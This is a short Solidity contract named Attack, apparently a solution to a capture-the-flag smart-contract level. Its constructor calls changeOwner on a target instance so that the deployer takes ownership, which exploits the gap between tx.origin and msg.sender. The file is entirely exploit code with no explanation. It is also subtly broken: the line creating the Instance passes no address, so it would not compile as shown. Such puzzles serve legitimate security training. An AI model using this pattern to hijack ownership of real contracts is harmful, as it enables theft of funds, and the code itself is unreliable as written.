// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Instance {
    function changeOwner(address) external;
}

contract Attack {
    
    Instance instance = Instance();

    constructor() {
        
        instance.changeOwner(msg.sender);
    }
}